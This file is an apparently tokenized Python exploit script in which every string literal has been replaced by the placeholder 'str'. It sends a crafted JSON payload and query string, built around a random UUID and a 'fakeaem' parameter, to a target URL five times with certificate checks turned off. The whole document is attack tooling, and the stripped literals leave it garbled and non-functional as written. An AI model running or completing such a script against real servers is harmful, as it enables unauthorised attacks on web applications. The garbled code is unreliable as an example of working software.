import	sys	
import	argparse	
import	uuid	
from	urllib	.	parse	import	unquote	

import	requests	

requests	.	packages	.	urllib3	.	disable_warnings	(	)	


def	http_request	(	url	,	method	=	"str"	,	data	=	None	,	additional_headers	=	None	,	proxy	=	None	)	:	
headers	=	{	"str"	:	"str"	}	
if	additional_headers	:	
headers	.	update	(	additional_headers	)	

if	not	proxy	:	
proxy	=	{	}	

resp	=	requests	.	request	(	method	,	url	,	data	=	data	,	headers	=	headers	,	proxies	=	proxy	,	verify	=	False	,	timeout	=	15	,	allow_redirects	=	False	)	

return	resp	


def	exploit	(	url	,	fakeaem	,	proxy	=	None	)	:	

JSON_DATA	=	"str"	
PARAMS	=	"str"	

id	=	uuid	.	uuid4	(	)	

json_data	=	JSON_DATA	.	format	(	id	,	fakeaem	.	replace	(	"str"	,	"str"	)	)	

params	=	PARAMS	.	format	(	id	,	len	(	unquote	(	json_data	)	)	,	json_data	)	

for	_	in	range	(	5	)	:	
http_request	(	url	+	params	,	proxy	=	proxy	)	


def	parse_args	(	)	:	
parser	=	argparse	.	ArgumentParser	(	)	

parser	.	add_argument	(	"str"	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	help	=	"str"	)	

return	parser	.	parse_args	(	sys	.	argv	[	1	:	]	)	


def	main	(	)	:	
args	=	parse_args	(	)	

if	args	.	proxy	:	
p	=	args	.	proxy	
proxy	=	{	"str"	:	p	,	"str"	:	p	}	
else	:	
proxy	=	{	}	

if	not	args	.	url	or	not	args	.	fakeaem	:	
print	(	"str"	)	
sys	.	exit	(	1337	)	

exploit	(	args	.	url	,	args	.	fakeaem	,	proxy	)	


if	__name__	==	"str"	:	
main	(	)	
	